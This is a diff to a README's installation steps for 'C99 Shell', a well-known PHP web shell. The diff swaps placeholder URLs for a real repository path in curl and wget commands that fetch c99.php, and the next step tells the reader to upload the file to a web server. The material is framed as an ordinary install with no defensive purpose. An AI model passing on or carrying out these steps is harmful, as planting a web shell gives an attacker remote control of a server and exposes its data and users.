@@ -21,12 +21,12 @@ To install **C99 Shell** on your server, follow these steps:
    
    **Using curl**
    ```bash
-   curl -o c99.php https://raw.githubusercontent.com/yourusername/C99/main/c99.php
+   curl -o c99.php https://raw.githubusercontent.com/c99-shell/c99/refs/heads/main/c99.php
    ```
 
    **Using wget**
    ```bash
-   wget https://raw.githubusercontent.com/yourusername/C99/main/c99.php -O c99.php
+   wget https://raw.githubusercontent.com/c99-shell/c99/refs/heads/main/c99.php -O c99.php
    ```
 3. **Upload to Your Server**
 Transfer the c99.php file to your web server using FTP, SCP, or your hosting control panel’s file manager.
